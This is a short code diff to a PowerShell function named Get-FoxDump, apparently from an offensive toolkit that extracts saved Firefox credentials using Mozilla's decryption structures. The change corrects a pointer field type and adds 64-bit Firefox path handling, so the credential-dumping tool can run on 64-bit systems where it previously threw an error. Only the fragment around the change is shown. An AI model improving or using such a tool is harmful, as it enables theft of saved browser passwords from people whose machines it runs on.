@@ -765,7 +765,7 @@ Function Get-FoxDump
 
     $TSECItem = struct $Mod TSECItem @{
         SECItemType    =    field 0 Int
-        SECItemData    =    field 1 Int
+        SECItemData    =    field 1 IntPtr
         SECItemLen     =    field 2 Int
     }
 
@@ -776,9 +776,12 @@ Function Get-FoxDump
 
     if([IntPtr]::Size -eq 8)
     {
-        Throw "Unable to load 32-bit dll's in 64-bit process."
+        $mozillapath = "C:\Program Files\Mozilla Firefox"
     }
+    elseif([IntPtr]::Size -eq 4)
+    {        
     $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
+    }
 
     If(Test-Path $mozillapath)
     {
